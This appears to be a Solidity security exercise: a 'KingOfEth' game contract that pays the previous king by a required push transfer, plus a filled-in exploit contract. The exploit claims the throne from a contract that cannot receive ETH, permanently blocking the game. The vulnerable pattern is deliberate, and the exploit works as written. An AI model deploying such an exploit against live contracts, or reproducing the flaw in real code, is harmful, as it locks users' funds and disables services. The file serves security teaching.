// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
// Deposit more than previous user to become the king.

//Become the king and disable the contract so that no else can ever become the new king.

// 10 ETH will be sent to pwn.

contract KingOfEth {
    address payable public king;

    function play() external payable {
        // previous balance = current balance - ETH sent
        uint256 bal = address(this).balance - msg.value;
        require(msg.value > bal, "need to pay more to become the king");

        (bool sent, ) = king.call{value: bal}("");
        require(sent, "failed to send ETH");

        king = payable(msg.sender);
    }
}


interface IKingOfEth {
    function play() external payable;
}

contract KingOfEthExploit {
    IKingOfEth public target;

    constructor(address _target) {
        target = IKingOfEth(_target);
    }

    function pwn() external payable {
        // write your code here
        target.play{value:msg.value}();

    }
}
